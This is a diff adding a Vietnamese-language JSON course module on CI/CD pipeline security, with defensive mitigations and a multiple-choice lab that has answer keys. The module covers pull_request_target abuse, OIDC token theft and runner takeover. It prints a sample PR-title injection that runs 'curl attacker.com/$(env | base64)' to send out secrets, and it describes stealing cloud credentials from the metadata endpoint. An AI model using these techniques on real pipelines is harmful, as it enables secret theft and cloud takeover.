@@ -1,0 +1,1200 @@
+{
+  "id": "os09-m04-cicd-artifacts-capstone",
+  "slug": "cicd-artifacts-capstone",
+  "trackId": "os09-cloud-container-supply-chain",
+  "title": "Đường Ống CI/CD, Chuỗi Cung Ứng Phần Mềm, Ký Số Artifacts & Bài Tập Capstone Đám Mây",
+  "summary": "Phân tích các vector tấn công hạ tầng CI/CD (pull_request_target, Runner Takeover), kiểm soát rủi ro chuỗi cung ứng phần mềm qua khung bảo mật SLSA, ký số container Sigstore/Cosign và SBOM, và thực hiện bài tập Capstone tổng hợp chuỗi tấn công End-to-End từ Source Code đến Cloud Control Plane.",
+  "difficulty": "expert",
+  "estimatedMinutes": 540,
+  "careerPaths": ["penetration-test", "red-team", "purple-team"],
+  "domains": ["cloud", "container", "cicd", "supply-chain"],
+  "safetyLevel": "isolated-only",
+  "lessons": [
+    {
+      "id": "os09-l88-cicd-pipeline-security-and-runner-compromise",
+      "slug": "cicd-pipeline-security-and-runner-compromise",
+      "title": "An Ninh Hạ Tầng CI/CD: Khai Thác pull_request_target, Runner Takeover & Đánh Cắp OIDC Secrets",
+      "summary": "Phân tích toàn diện kiến trúc bảo mật đường ống CI/CD hiện đại (GitHub Actions, GitLab CI), phân biệt ranh giới an ninh giữa sự kiện pull_request và pull_request_target, giải phẫu kỹ thuật tiêm mã biểu thức (Expression Script Injection), trích xuất OIDC federated tokens (ACTIONS_ID_TOKEN_REQUEST_TOKEN) kết nối AWS/GCP/Azure, chiếm quyền điều khiển Self-Hosted Runners và kỹ thuật leo thang lateral movement từ hạ tầng runner vào mạng nội bộ doanh nghiệp.",
+      "difficulty": "expert",
+      "durationMinutes": 180,
+      "prerequisites": [],
+      "outcomes": [
+        "Phân tích sự khác biệt cốt lõi về mặt bảo mật và ranh giới quyền hạn giữa các trigger pull_request và pull_request_target trong GitHub Actions, xác định nguy cơ thực thi mã từ fork untrusted.",
+        "Bóc tách kỹ thuật khai thác Context Injection (Expression Injection) trong workflow scripts khi sử dụng ${{ github.event.* }} không qua kiểm duyệt và cơ chế phòng chống qua biến môi trường an toàn.",
+        "Kiểm toán cơ chế OpenID Connect (OIDC) Workload Identity Federation giữa GitHub Actions và Cloud Providers (AWS STS, GCP Workload Identity), khai thác rò rỉ token và siết chặt IAM Trust Policy Subject claims.",
+        "Đánh giá bề mặt tấn công của Self-Hosted Runners (Persistent vs Ephemeral, Shared Runner Groups), khai thác thoát container/máy ảo runner và leo thang lateral movement vào mạng nội bộ doanh nghiệp."
+      ],
+      "careerPaths": ["penetration-test", "red-team", "purple-team"],
+      "domains": ["cloud", "container", "cicd", "supply-chain"],
+      "attackTactics": [
+        "initial-access",
+        "execution",
+        "credential-access",
+        "privilege-escalation",
+        "lateral-movement"
+      ],
+      "keywords": [
+        "cicd-security",
+        "github-actions",
+        "pull_request_target",
+        "runner-takeover",
+        "oidc-federation",
+        "script-injection",
+        "self-hosted-runners",
+        "github-token",
+        "secrets-exfiltration"
+      ],
+      "safetyLevel": "isolated-only",
+      "mentalModel": "Đường ống CI/CD hiện đại chính là máy chủ sản xuất có đặc quyền cao nhất (ultimate production server) nhưng lại thường xuyên thực thi mã nguồn chưa được kiểm duyệt từ Internet. Kẻ tấn công không cần phá vỡ tường lửa hay dò tìm lỗ hổng 0-day trên ứng dụng web khi họ có thể gửi một Pull Request được chế tác tinh vi để kích hoạt CI/CD runner. Nếu đường ống chạy với sự kiện 'pull_request_target' mà checkout mã của nhánh PR, hoặc chèn trực tiếp các biến context (như github.event.issue.title) vào câu lệnh shell 'run:', kẻ tấn công có thể thực thi mã tùy ý (RCE) ngay trong ngữ cảnh nắm giữ các secrets tối mật của kho chứa và token OIDC có quyền truy cập vào Cloud Control Plane. Runner không phải là một sandbox vô hại; nó là bàn đạp vàng (golden pivot) để đánh cắp định danh đám mây và đột nhập mạng nội bộ.",
+      "visual": {
+        "title": "Chuỗi Tấn Công Chiếm Đoạt CI/CD Runner & Leo Thang Lên Cloud Qua OIDC Token",
+        "caption": "Luồng khai thác từ việc gửi Pull Request độc hại đến việc đánh cắp token OIDC và mạo danh IAM Role trên AWS/GCP.",
+        "steps": [
+          {
+            "label": "Trinh Sát Workflow Kém Bảo Mật",
+            "detail": "Kẻ tấn công phát hiện file workflow .github/workflows/ci.yml sử dụng trigger pull_request_target kết hợp actions/checkout với ref: ${{ github.event.pull_request.head.sha }} và cấp quyền id-token: write.",
+            "tone": "neutral"
+          },
+          {
+            "label": "Gửi PR Độc Hại Khai Thác Context Script Injection",
+            "detail": "Kẻ tấn công tạo fork và mở Pull Request chứa payload chèn lệnh shell trong tên commit hoặc mã test nhằm can thiệp vào tiến trình build của workflow.",
+            "tone": "caution"
+          },
+          {
+            "label": "Đánh Cắp ACTIONS_ID_TOKEN_REQUEST_TOKEN",
+            "detail": "Script độc hại đọc biến môi trường $ACTIONS_ID_TOKEN_REQUEST_TOKEN và gọi API local của runner để lấy OpenID Connect (OIDC) JWT mang danh tính của repo.",
+            "tone": "caution"
+          },
+          {
+            "label": "Tráo Đổi Token Sang Cloud IAM & Chiếm Đoạt Hạ Tầng",
+            "detail": "Gửi JWT tới AWS STS AssumeRoleWithWebIdentity; do Trust Policy trên AWS cấu hình lỏng lẻo (sub: repo:org/*:*), kẻ tấn công nhận được STS temporary credentials với quyền AdministratorAccess.",
+            "tone": "stop"
+          }
+        ]
+      },
+      "sections": [
+        {
+          "title": "Kiến Trúc CI/CD Pipeline & Cạm Bẫy Chết Người Của Sự Kiện pull_request_target",
+          "paragraphs": [
+            "Hạ tầng tự động hóa CI/CD (Continuous Integration / Continuous Deployment) là trái tim của quy trình DevOps hiện đại, chịu trách nhiệm tự động biên dịch, kiểm thử, đóng gói và triển khai ứng dụng. Tuy nhiên, chính vì nắm giữ vai trò trung tâm và sở hữu nhiều đặc quyền tối mật (API keys, SSH keys, chứng thư triển khai đám mây, quyền ghi mã nguồn), CI/CD runner đã trở thành mục tiêu tấn công hàng đầu của tin tặc. Trong các nền tảng như GitHub Actions, ranh giới an ninh giữa các sự kiện kích hoạt (Event Triggers) là yếu tố quyết định sự an toàn của toàn bộ tổ chức.",
+            "Mô hình sự kiện 'pull_request' truyền thống được thiết kế với cơ chế phòng ngự nghiêm ngặt: khi một lập trình viên từ bên ngoài tạo fork của kho chứa và gửi một Pull Request (PR), workflow chạy trên nhánh PR đó sẽ hoàn toàn không có quyền truy cập vào kho lưu trữ bí mật (Secrets) của kho gốc (Base Repository). Đồng thời, token mặc định GITHUB_TOKEN chỉ được cấp quyền đọc (read-only), nhằm ngăn chặn mã nguồn chưa được kiểm duyệt trong PR có thể đánh cắp secrets hoặc chỉnh sửa mã nguồn chính. Tuy nhiên, sự cô lập này lại gây khó khăn cho các workflow tự động hóa hợp pháp, chẳng hạn như gán nhãn (labeling), thêm bình luận phản hồi người dùng hoặc chạy các bài kiểm thử tích hợp yêu cầu token nội bộ.",
+            "Để giải quyết nhu cầu đó, GitHub giới thiệu sự kiện 'pull_request_target'. Khác biệt căn bản và nguy hiểm nhất của pull_request_target là: workflow sẽ thực thi trong ngữ cảnh của nhánh đích (base branch, thường là 'main') của kho gốc. Điều này đồng nghĩa với việc workflow sở hữu toàn quyền truy cập vào toàn bộ Secrets của kho chứa và GITHUB_TOKEN có thể được cấp quyền ghi (write permissions). Hiểm họa chết người xuất hiện khi các kỹ sư DevOps vô tình kết hợp pull_request_target với chỉ thị checkout mã nguồn của PR: 'uses: actions/checkout@v4' đi kèm 'with: ref: ${{ github.event.pull_request.head.sha }}'. Khi dòng cấu hình này xuất hiện, runner sẽ tải toàn bộ mã nguồn độc hại từ nhánh fork của kẻ tấn công về và thực thi các bước tiếp theo (như npm test, make build, hoặc chạy script kiểm thử). Toàn bộ mã độc của kẻ tấn công lập tức được chạy với đầy đủ quyền hạn và secrets của kho gốc, biến cơ chế bảo vệ của GitHub thành con số không.",
+            "Bên cạnh cạm bẫy checkout, kỹ thuật Context Injection (Expression Injection) là một vector tấn công cực kỳ phổ biến. Nhiều kỹ sư viết các câu lệnh shell trực tiếp trong block 'run:' có nhúng biểu thức nội suy của GitHub Actions, ví dụ: 'run: echo \"Testing PR title: ${{ github.event.pull_request.title }}\"'. Trước khi chuyển câu lệnh sang trình thông dịch bash, GitHub Actions Runner sẽ đánh giá biểu thức nội suy `${{ ... }}` và thay thế nó bằng chuỗi văn bản thô. Nếu kẻ tấn công đặt tiêu đề PR là 'test\"; curl attacker.com/$(env | base64); echo \"done', câu lệnh thực thi trong shell sẽ bị bẻ gãy cú pháp, dẫn đến việc thực thi câu lệnh shell độc hại tùy ý (Remote Code Execution - RCE). Biện pháp khắc phục bắt buộc là không bao giờ truyền trực tiếp biến context vào câu lệnh shell, mà phải thông qua biến môi trường an toàn: 'env: PR_TITLE: ${{ github.event.pull_request.title }}' và trong shell chỉ gọi '$PR_TITLE'."
+          ]
+        },
+        {
+          "title": "OpenID Connect (OIDC) Federation Trong CI/CD: Cơ Chế Token Exchange & Rủi Ro Sai Cấu Hình Claims",
+          "paragraphs": [
+            "Trước đây, để cho phép CI/CD pipeline triển khai ứng dụng lên các nền tảng đám mây như AWS, Google Cloud hay Microsoft Azure, các tổ chức buộc phải tạo ra các tài khoản dịch vụ có thời hạn dài (Long-lived Credentials như AWS IAM User Access Keys hoặc GCP Service Account Keys) và lưu chúng dưới dạng GitHub Secrets. Cách làm này ẩn chứa rủi ro rất lớn: khóa có thể bị rò rỉ qua log runner, bị lập trình viên in ra màn hình hoặc bị kẻ tấn công đánh cắp khi chiếm được quyền kiểm soát runner, và việc thu hồi/xoay vòng khóa (key rotation) thường rất chậm trễ và phức tạp.",
+            "Sự ra đời của OpenID Connect (OIDC) Workload Identity Federation đã cách mạng hóa cơ chế xác thực CI/CD: chuyển đổi từ khóa dài hạn sang mô hình chứng thư tạm thời ngắn hạn (Short-lived Keyless Authentication). Trong mô hình này, GitHub Actions hoạt động như một OIDC Identity Provider (IdP). Khi một workflow cần xác thực với AWS, workflow khai báo quyền 'permissions: id-token: write'. Runner sẽ kết nối tới endpoint cục bộ thông qua hai biến môi trường hệ thống là $ACTIONS_ID_TOKEN_REQUEST_URL và $ACTIONS_ID_TOKEN_REQUEST_TOKEN để lấy về một JSON Web Token (JWT) được ký số bởi GitHub Token Authority ('https://token.actions.githubusercontent.com').",
+            "JWT này chứa các trường dữ liệu định danh (Claims) rất phong phú, bao gồm: 'iss' (đơn vị phát hành), 'aud' (đối tượng nhận token), 'repository' (tên kho chứa, ví dụ: my-org/payment-service), 'repository_owner' (chủ sở hữu repo), và đặc biệt là 'sub' (Subject Claim, ví dụ: 'repo:my-org/payment-service:ref:refs/heads/main' hoặc 'repo:my-org/payment-service:pull_request'). Runner sau đó gửi JWT này tới dịch vụ đám mây (như AWS Security Token Service - STS với hàm AssumeRoleWithWebIdentity) để đổi lấy các temporary credentials có thời hạn chỉ từ 15 phút đến 1 giờ.",
+            "Tuy nhiên, an ninh của toàn bộ liên minh định danh này phụ thuộc hoàn toàn vào độ chặt chẽ của IAM Role Trust Policy trên nền tảng đám mây. Một lỗ hổng cấu hình phổ biến nhưng mang tính thảm họa là quản trị viên thiết lập điều kiện kiểm tra Subject Claim quá lỏng lẻo bằng ký tự đại diện (*): ví dụ: '\"StringLike\": { \"token.actions.githubusercontent.com:sub\": \"repo:my-org/*:*\" }'. Khi cấu hình như vậy, bất kỳ repository nào thuộc tổ chức my-org (kể cả một kho chứa tài liệu, dự án thử nghiệm hoặc repo công khai), và bất kỳ nhánh hoặc sự kiện pull_request nào cũng có thể xin cấp token OIDC và mạo danh vai trò IAM này. Kẻ tấn công chỉ cần tạo một PR hoặc commit mã vào một kho chứa không quan trọng trong tổ chức là đã có thể đánh cắp quyền quản trị tối cao trên AWS Control Plane. Để đảm bảo an toàn, Trust Policy phải kiểm tra chính xác tuyệt đối tên repo và chỉ cho phép nhánh sản xuất ('repo:my-org/payment-service:ref:refs/heads/main') hoặc môi trường cụ thể ('repo:my-org/payment-service:environment:production')."
+          ]
+        },
+        {
+          "title": "Self-Hosted Runners vs Hosted Runners: Bề Mặt Tấn Công Runner Takeover & Lateral Movement",
+          "paragraphs": [
+            "Mô hình thực thi mã của CI/CD runner chia làm hai nhóm chính: GitHub-Hosted Runners và Self-Hosted Runners. GitHub-Hosted Runners là các máy ảo độc lập do GitHub quản lý trên nền tảng Azure. Mỗi job chạy trong một máy ảo hoàn toàn mới (Clean Ephemeral VM) và máy ảo sẽ bị tiêu hủy ngay lập tức sau khi job kết thúc. Mặc dù an toàn trước nguy cơ tồn đọng dữ liệu giữa các lần build, các hosted runners bị giới hạn về cấu hình phần cứng, chi phí cao và không có khả năng kết nối trực tiếp vào các mạng riêng nội bộ (Private VPC/Subnet) của doanh nghiệp.",
+            "Để đáp ứng nhu cầu tối ưu chi phí, tận dụng GPU hoặc cho phép pipeline deploy trực tiếp vào mạng nội bộ mà không cần mở cổng Internet, nhiều doanh nghiệp đã triển khai Self-Hosted Runners. Đây là các máy chủ vật lý, máy ảo EC2/VMware hoặc container do doanh nghiệp tự quản lý và cài đặt phần mềm runner agent để lắng nghe tác vụ từ GitHub. Tuy nhiên, việc sử dụng Self-Hosted Runners sai cách tạo ra một lỗ hổng an ninh mạng khổng lồ, biến máy chủ build thành cửa sau (Backdoor) lý tưởng cho tin tặc thâm nhập vào sâu trong mạng doanh nghiệp.",
+            "Nguy cơ cốt tử đầu tiên là Hiện Tượng Tồn Đọng Trạng Thái (State Persistence). Nếu Self-Hosted Runner được cấu hình dưới dạng máy chủ cố định (persistent runner) chạy liên tục qua nhiều jobs thay vì máy ảo dùng một lần (ephemeral runner), các tệp tin, biến môi trường, cache, docker images và socket của job trước sẽ lưu lại cho job tiếp theo. Kẻ tấn công chỉ cần kích hoạt một job có khả năng thực thi lệnh (qua PR độc hại hoặc commit) để cài cắm backdoor vào thư mục '_work', sửa đổi tệp cấu hình bash ('~/.bashrc', '~/.profile') hoặc cấy mã độc vào cache của trình biên dịch. Khi các lập trình viên khác hoặc các job sản xuất chạy sau đó, mã độc sẽ kích hoạt và đánh cắp mã nguồn mật hoặc credentials của toàn bộ tổ chức.",
+            "Nguy cơ thứ hai là Tấn Công Lan Ngang (Lateral Movement) và Lạm Dụng IMDS. Self-Hosted Runner thường được kết nối trực tiếp vào mạng VPC nội bộ, nơi đặt các cơ sở dữ liệu quan trọng, máy chủ Kubernetes API riêng tư và các dịch vụ microservice nội bộ. Khi kẻ tấn công giành được quyền RCE trên runner, họ có thể dùng máy chủ này như một bàn đạp (pivot point) để quét mạng nội bộ, nghe lén lưu lượng hoặc tấn công các hệ thống khác mà tường lửa biên không thể ngăn cản. Nghiêm trọng hơn, nếu runner chạy trên một máy chủ đám mây (như AWS EC2) mà không được cấu hình IMDSv2 với Hop Limit = 1, kẻ tấn công có thể truy vấn địa chỉ metadata 'http://169.254.169.254' để đánh cắp IAM Role gắn liền với máy chủ đó (EC2 Instance Profile), từ đó leo thang đặc quyền ra toàn bộ hạ tầng đám mây. Vì lý do này, GitHub khuyến cáo nghiêm ngặt: Tuyệt đối không bao giờ sử dụng Self-Hosted Runners cho các kho chứa công khai (Public Repositories), và phải luôn triển khai mô hình Ephemeral Autoscaling Runners (như Actions Runner Controller - ARC trên Kubernetes) để đảm bảo mỗi job chạy trong một container hoàn toàn cô lập và bị hủy ngay sau khi hoàn thành."
+          ]
+        },
+        {
+          "title": "Chiến Lược Cách Ly & Tự Động Hóa Dọn Dẹp Runner Theo Chuẩn Zero-Trust",
+          "paragraphs": [
+            "Để giải quyết triệt để vấn đề state persistence và nguy cơ lây nhiễm chéo giữa các tác vụ CI/CD, các tổ chức phải áp dụng mô hình Ephemeral Autoscaling Runners theo nguyên tắc Zero-Trust. Thay vì duy trì các máy chủ runner dùng chung lâu dài, mô hình này khởi tạo một môi trường thực thi hoàn toàn mới cho từng job và tiêu hủy ngay lập tức khi job hoàn tất. Trên nền tảng Kubernetes, Actions Runner Controller (ARC) là giải pháp hàng đầu cho phép tự động điều phối vòng đời của các runner pods dựa trên nhu cầu thực tế của GitHub Actions thông qua Custom Resource Definitions (CRDs) như RunnerDeployment và HorizontalRunnerAutoscaler.",
+            "Tuy nhiên, việc chỉ chạy runner trong các container Docker tiêu chuẩn (runc) vẫn tiềm ẩn nguy cơ container breakout nếu nhân kernel của host node bị tấn công. Để thiết lập ranh giới cách ly cấp độ phần cứng (Hardware-level Virtualization Isolation), hạ tầng runner hiện đại chuyển sang ứng dụng các công nghệ microVM và Container Sandboxing như Kata Containers hoặc Firecracker. Kata Containers kết hợp trải nghiệm vùng chứa với máy ảo QEMU/Cloud-Hypervisor siêu nhẹ, cung cấp nhân kernel Linux độc lập cho từng runner pod. Firecracker của AWS cho phép khởi động các microVM hoàn toàn cách ly chỉ trong vài mili-giây với footprint bộ nhớ cực thấp, đảm bảo kẻ tấn công dù chiếm được quyền root trong runner cũng không thể tác động tới máy chủ vật lý.",
+            "Bên cạnh cách ly điện toán, kiểm soát mạng (Network Segmentation & Least Privilege) là trụ cột không thể thiếu trong kiến trúc runner Zero-Trust. Quản trị viên phải triển khai Kubernetes Network Policies để cấm toàn bộ lưu lượng ingress tới runner pod và chỉ cho phép egress kết nối ra các IP/domain thiết yếu của GitHub ('api.github.com', 'actions-results.githubusercontent.com') cùng các OCI registry đã được kiểm định. Tuyệt đối chặn đứng mọi kết nối từ runner pod tới mạng nội bộ của doanh nghiệp, máy chủ Kubernetes API nội bộ và địa chỉ Link-local Metadata 169.254.169.254, triệt tiêu hoàn toàn khả năng biến runner thành bàn đạp tấn công lan ngang (lateral movement pivot)."
+          ]
+        }
+      ],
+      "lab": {
+        "title": "Kiểm Toán Bề Mặt Tấn Công CI/CD Runner, Khai Thác OIDC Misconfiguration & Hardening Workflow",
+        "objective": "Phân tích các lỗ hổng workflow trigger trong GitHub Actions, phát hiện nguy cơ rò rỉ token OIDC sang Cloud Control Plane, và xây dựng mô hình Self-Hosted Runner cô lập theo chuẩn bảo mật doanh nghiệp.",
+        "scenario": "Một ngân hàng thương mại cổ phần vận hành hệ thống CI/CD trên nền tảng GitHub Enterprise và AWS Cloud. Đội ngũ An ninh Mạng phát hiện một số repository open-source của ngân hàng sử dụng trigger pull_request_target kết hợp cấp quyền OIDC id-token: write lên tài khoản AWS sản xuất. Đồng thời, một cụm máy chủ Self-Hosted Runners đang chạy trực tiếp trong mạng VPC nội bộ mà không có cơ chế dọn dẹp môi trường sau mỗi lần build.",
+        "constraints": [
+          "Tuyệt đối tuân thủ ADR-001: Toàn bộ phân tích phải dựa trên mô hình rủi ro kỹ thuật thực tế của GitHub Actions và AWS IAM, không sử dụng mock simulator giả lập.",
+          "Mọi đề xuất hardening phải bảo đảm không làm gián đoạn quy trình tích hợp liên tục của các nhóm phát triển và không ảnh hưởng đến thời gian phản hồi (build latency).",
+          "Giải pháp đề xuất phải tuân thủ chuẩn CIS Software Supply Chain Benchmark và hướng dẫn bảo mật GitHub Security Lab."
+        ],
+        "cases": [
+          {
+            "id": "case-88-01",
+            "title": "Xử Lý Lỗ Hổng pull_request_target Kết Hợp Checkout Nhánh Untrusted PR",
+            "context": "Một repository mã nguồn mở của ngân hàng chứa workflow auto-label.yml được cấu hình 'on: pull_request_target'. Để chạy kiểm thử linter và tự động gán nhãn, workflow sử dụng step 'actions/checkout' với 'ref: ${{ github.event.pull_request.head.sha }}', sau đó chạy 'npm install && npm run lint'. Kho chứa có lưu trữ secret PROD_NPM_TOKEN để tải các thư viện nội bộ.",
+            "prompt": "Hành động nào sau đây loại bỏ triệt để nguy cơ thực thi mã độc và rò rỉ secrets từ các PR của người đóng góp bên ngoài?",
+            "options": [
+              {
+                "id": "A",
+                "label": "Giữ nguyên 'pull_request_target' nhưng thêm điều kiện 'if: github.actor != \"bot\"' để ngăn chặn các tài khoản tự động gửi PR độc hại.",
+                "correct": false,
+                "rationale": "Điều kiện này vô nghĩa vì kẻ tấn công là người dùng thực (human actor) có tài khoản GitHub hoàn toàn hợp lệ, vẫn có thể mở PR và kích hoạt workflow độc hại."
+              },
+              {
+                "id": "B",
+                "label": "Tách quy trình thành 2 workflow độc lập: Chuyển toàn bộ việc checkout mã nguồn PR và chạy npm test/lint sang sự kiện 'pull_request' an toàn (không có quyền truy cập secrets); chỉ sử dụng 'pull_request_target' cho các tác vụ cần secrets (như comment hoặc gắn nhãn) nhưng tuyệt đối KHÔNG checkout mã untrusted của PR.",
+                "correct": true,
+                "rationale": "Đây là kiến trúc chuẩn mực theo khuyến nghị của GitHub Security Lab. Việc tách rời đảm bảo mã từ fork chỉ chạy trong môi trường bị cô lập hoàn toàn (không có secrets và GITHUB_TOKEN chỉ đọc), trong khi tác vụ có đặc quyền chỉ xử lý metadata mà không nạp mã của PR."
+              },
+              {
+                "id": "C",
+                "label": "Đổi tên secret PROD_NPM_TOKEN thành INTERNAL_TOKEN_HIDDEN để kẻ tấn công không đoán được tên biến môi trường.",
+                "correct": false,
+                "rationale": "Security through obscurity hoàn toàn vô giá trị; khi kẻ tấn công có RCE trên runner qua npm install postinstall script, họ chỉ cần gõ lệnh 'env' hoặc đọc bộ nhớ runner để lấy toàn bộ secrets."
+              },
+              {
+                "id": "D",
+                "label": "Sử dụng cờ '--ignore-scripts' trong lệnh npm install và giữ nguyên toàn bộ cấu hình workflow hiện tại.",
+                "correct": false,
+                "rationale": "Mặc dù cờ --ignore-scripts ngăn chặn postinstall scripts lúc cài đặt, nhưng bước 'npm run lint' ngay sau đó vẫn sẽ thực thi các linter plugins hoặc mã độc hại nằm trong nhánh PR của kẻ tấn công."
+              }
+            ]
+          },
+          {
+            "id": "case-88-02",
+            "title": "Siết Chặt IAM Role Trust Policy Cho GitHub Actions OIDC Federation Trên AWS",
+            "context": "Kỹ sư DevOps cấu hình AWS IAM Role DeployerRole để GitHub Actions tự động cập nhật hạ tầng. Trong IAM Trust Policy, kỹ sư thiết lập: '\"Condition\": { \"StringLike\": { \"token.actions.githubusercontent.com:sub\": \"repo:bank-corp/*:*\" } }'. Ngân hàng có hơn 200 repositories trong organization, bao gồm cả các repo thực tập sinh và repo thử nghiệm công khai.",
+            "prompt": "Lỗ hổng bảo mật nghiêm trọng trong cấu hình trên là gì và phương án siết chặt Trust Policy chuẩn mực nhất theo nguyên tắc Least Privilege là gì?",
+            "options": [
+              {
+                "id": "A",
+                "label": "Cấu hình hiện tại đã rất an toàn vì đã giới hạn trong phạm vi tổ chức 'bank-corp'; không cần chỉnh sửa thêm.",
+                "correct": false,
+                "rationale": "Cực kỳ nguy hiểm vì bất kỳ ai có quyền tạo repo hoặc mở PR trên một repo bất kỳ của bank-corp đều có thể tạo workflow xin OIDC token và nhận quyền DeployerRole trên AWS."
+              },
+              {
+                "id": "B",
+                "label": "Xóa bỏ OIDC Federation và quay lại tạo IAM User với Access Key vĩnh viễn lưu vào GitHub Secrets.",
+                "correct": false,
+                "rationale": "Quay lại sử dụng static long-lived credentials là một bước thụt lùi lớn về bảo mật, làm gia tăng nguy cơ rò rỉ khóa dài hạn và vi phạm chuẩn CIS Cloud Benchmark."
+              },
+              {
+                "id": "C",
+                "label": "Thay thế điều kiện StringLike lỏng lẻo bằng StringEquals nghiêm ngặt: kiểm tra chính xác tên repo cụ thể và gắn chặt với nhánh sản xuất ('repo:bank-corp/payment-service:ref:refs/heads/main') hoặc môi trường triển khai ('repo:bank-corp/payment-service:environment:production'), đồng thời kiểm tra claim 'aud' phải khớp với 'sts.amazonaws.com'.",
+                "correct": true,
+                "rationale": "Khớp chính xác cả repository, branch/environment và audience triệt tiêu hoàn toàn nguy cơ privilege escalation từ các repos khác hoặc các PR nhánh con trong cùng tổ chức."
+              },
+              {
+                "id": "D",
+                "label": "Thêm điều kiện kiểm tra địa chỉ IP công cộng của GitHub Actions Runners vào IAM Trust Policy.",
+                "correct": false,
+                "rationale": "GitHub Actions sử dụng dải IP động khổng lồ của Azure thay đổi liên tục hàng tuần, việc whitelist IP không khả thi và không thể ngăn chặn các workflow khác trong cùng dải IP của GitHub."
+              }
+            ]
+          },
+          {
+            "id": "case-88-03",
+            "title": "Kiến Trúc Tái Cấu Trúc Self-Hosted Runner Cố Định Thành Ephemeral Sandboxed Cluster",
+            "context": "Đội ngũ phát triển hạ tầng triển khai 5 máy chủ ảo EC2 cố định đóng vai trò Self-Hosted Runners kết nối vào GitHub Organization và nằm trong mạng VPC nội bộ (chứa DB thanh toán). Các runner này chạy với quyền root, mount /var/run/docker.sock để build container và không bao giờ hủy máy sau khi chạy job.",
+            "prompt": "Kiến trúc nào sau đây chuyển đổi cụm Runner đảm bảo tính cô lập tuyệt đối giữa các job và triệt tiêu nguy cơ lateral movement vào mạng nội bộ?",
+            "options": [
+              {
+                "id": "A",
+                "label": "Thiết lập một cron job trên mỗi máy chủ EC2 để chạy lệnh 'docker system prune -af' mỗi đêm lúc 12h.",
+                "correct": false,
+                "rationale": "Dọn dẹp định kỳ vào ban đêm không giải quyết được nguy cơ tồn đọng dữ liệu và cài backdoor giữa các jobs chạy trong ngày; kẻ tấn công vẫn có thể chiếm đoạt dữ liệu của job chạy ngay sau đó."
+              },
+              {
+                "id": "B",
+                "label": "Chuyển sang triển khai bộ điều khiển Actions Runner Controller (ARC) trên cụm Kubernetes cô lập: mỗi job được cấp phát một Runner Pod mới tinh (Ephemeral Runner) và Pod tự động bị tiêu hủy ngay sau khi kết thúc; loại bỏ mount docker.sock bằng cách dùng Kaniko/Podman rootless; đồng thời cô lập mạng VPC của Runner bằng Network Security Group và áp dụng IMDSv2 với Hop Limit = 1.",
+                "correct": true,
+                "rationale": "Mô hình Ephemeral ARC đảm bảo môi trường hoàn toàn sạch cho mỗi job (Zero State Persistence), loại bỏ vector Docker socket breakout, ngăn chặn truy cập IMDS và cô lập đường truyền mạng triệt tiêu mọi khả năng lan ngang."
+              },
+              {
+                "id": "C",
+                "label": "Tạo thêm một tài khoản người dùng 'runner-user' không đặc quyền trên EC2 nhưng vẫn giữ nguyên việc mount /var/run/docker.sock.",
+                "correct": false,
+                "rationale": "Bất kỳ người dùng nào có quyền truy cập vào Docker socket đều tương đương với quyền root máy chủ; kẻ tấn công chỉ cần khởi chạy container privileged để leo thang lên root ngay lập tức."
+              },
+              {
+                "id": "D",
+                "label": "Gán các Self-Hosted Runners này cho tất cả các Public Repositories của ngân hàng để tăng tốc độ build cho cộng đồng.",
+                "correct": false,
+                "rationale": "Đây là hành vi vi phạm nghiêm trọng cảnh báo an ninh của GitHub; bất kỳ ai trên Internet cũng có thể gửi PR để chạy mã độc và kiểm soát máy chủ nằm trong mạng nội bộ của ngân hàng."
+              }
+            ]
+          }
+        ],
+        "successCriteria": [
+          "Nhận diện chính xác cơ chế khai thác của lỗ hổng pull_request_target kết hợp checkout untrusted ref và context expression injection.",
+          "Xác định đúng nguyên nhân gốc rễ của việc lạm dụng OIDC Federation trên AWS IAM và thiết kế Trust Policy với Subject claim chuẩn mực.",
+          "Đưa ra giải pháp kiến trúc Ephemeral Autoscaling Runner (ARC) triệt tiêu hoàn toàn rủi ro tồn đọng trạng thái và lateral movement."
+        ],
+        "evidenceTemplate": [
+          "Bản phân tích diff cấu hình workflow .github/workflows/*.yml trước và sau khi tách biệt sự kiện pull_request và pull_request_target",
+          "Tài liệu IAM Role Trust Policy (JSON) đã được siết chặt điều kiện Subject và Audience claims",
+          "Sơ đồ kiến trúc triển khai Actions Runner Controller (ARC) trên Kubernetes kèm cấu hình NetworkPolicy",
+          "Báo cáo kiểm toán cấu hình IMDSv2 Hop Limit trên toàn bộ các máy chủ EC2 Runner trong hạ tầng"
+        ],
+        "reset": "Khôi phục cấu hình workflow YAML, IAM Trust Policies và runner registration tokens về trạng thái ban đầu của môi trường kiểm thử.",
+        "cleanup": "Thu hồi toàn bộ các OIDC session tokens phát sinh trong quá trình kiểm toán, xóa bỏ các ephemeral runner instances tạm thời và xóa các commit thử nghiệm."
+      },
+      "governance": {
+        "prevent": [
+          "Cấm tuyệt đối việc sử dụng sự kiện 'pull_request_target' đi kèm chỉ thị checkout nhánh untrusted của PR hoặc chèn trực tiếp biểu thức context vào block 'run:' thông qua GitHub Action linter (actionlint) trong pre-commit hook.",
+          "Bắt buộc cấu hình IAM Role Trust Policy cho OIDC Federation phải đối soát chính xác tuyệt đối tên repository, owner và ref/environment cụ thể; nghiêm cấm sử dụng ký tự đại diện wildcard (*) trong Subject claim.",
+          "Triển khai 100% Self-Hosted Runners dưới dạng Ephemeral Runners (dùng một lần) thông qua Actions Runner Controller (ARC) và đặt runner trong phân vùng mạng (Subnet) bị cô lập không có đường định tuyến trực tiếp tới dữ liệu sản xuất."
+        ],
+        "observe": [
+          "Giám sát nhật ký GitHub Audit Logs đối với các sự kiện thay đổi workflow file, thay đổi secrets kho chứa ('org.secret_create', 'repo.secret_update') và đăng ký Self-Hosted Runner mới.",
+          "Thu thập và phân tích sự kiện AWS CloudTrail đối với API 'AssumeRoleWithWebIdentity', thiết lập cảnh báo SIEM khi có yêu cầu mạo danh role từ các repository hoặc branch lạ.",
+          "Triển khai eBPF/Sysmon trên máy chủ runner để phát hiện các tiến trình con bất thường sinh ra từ runner process (như curl tới 169.254.169.254, đào bới thư mục ~/.ssh hoặc kết nối tới địa chỉ IP ngoài danh mục cho phép)."
+        ],
+        "respond": [
+          "Khi phát hiện workflow bị khai thác RCE, lập tức hủy (cancel) toàn bộ các workflow runs đang chạy và vô hiệu hóa workflow bị tổn thương trên giao diện quản trị GitHub.",
+          "Xoay vòng (rotate) ngay lập tức toàn bộ Secrets của repository và tổ chức, bao gồm token triển khai, cloud credentials và API keys.",
